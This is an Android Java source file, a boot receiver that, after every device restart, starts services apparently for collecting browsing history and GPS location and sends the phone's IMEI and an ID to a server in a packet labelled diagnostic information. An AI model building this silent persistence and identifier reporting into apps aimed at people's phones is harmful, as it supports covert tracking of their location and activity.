package com.inet.android.bs;

import java.text.SimpleDateFormat;
import java.util.Calendar;

import com.inet.android.history.LinkService;
import com.inet.android.location.GPSTracker;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;
import android.util.Log;

public class BootBroadcastReceiver extends BroadcastReceiver {

	Context mContext;
	private final String BOOT_ACTION = "android.intent.action.BOOT_COMPLETED";
	SharedPreferences sp;
	private static final String LOG_TAG = "BootBroadcastReceiver";
	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		mContext = context;
		sp = PreferenceManager
				.getDefaultSharedPreferences(context);
	
		String action = intent.getAction();
		if (action.equalsIgnoreCase(BOOT_ACTION)) {
			// для Service
			
			Log.d(LOG_TAG, "start services after boot");
			FileLog.writeLog(LOG_TAG + " -> start services after boot");
			
			Intent linkServiceIntent = new Intent(context, LinkService.class);
			context.startService(linkServiceIntent);
			Intent locServiceIntent = new Intent(context, GPSTracker.class);
			context.startService(locServiceIntent);
			Intent request4ServiceIntent = new Intent(context, Request4.class);
			context.startService(request4ServiceIntent);
			String diag = "<packet><id>" + sp.getString("ID", "ID")
					+ "</id><time>" + logTime() + "</time><type>1</type><ttl>"
					+ sp.getString("BUILD", "A0003 2013-10-03 20:00:00")
					+ "</ttl><cls>" + sp.getString("IMEI", "0000")
					+ "</cls><app>Диагностическая информация</app><url>"
					+ Long.toString(System.currentTimeMillis())
					+ sp.getString("ABOUT", "about") + "</url></packet>";

			Request req = new Request(context);
			req.sendRequest(diag);
			Log.d(LOG_TAG, "end start services after boot");
			FileLog.writeLog(LOG_TAG + " -> end start services after boot");
		}
	}

	@SuppressLint("SimpleDateFormat")
	private static String logTime() {
		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		Calendar cal = Calendar.getInstance();
		cal.setTimeInMillis(System.currentTimeMillis());
		return "" + formatter.format(cal.getTime());

	}
}
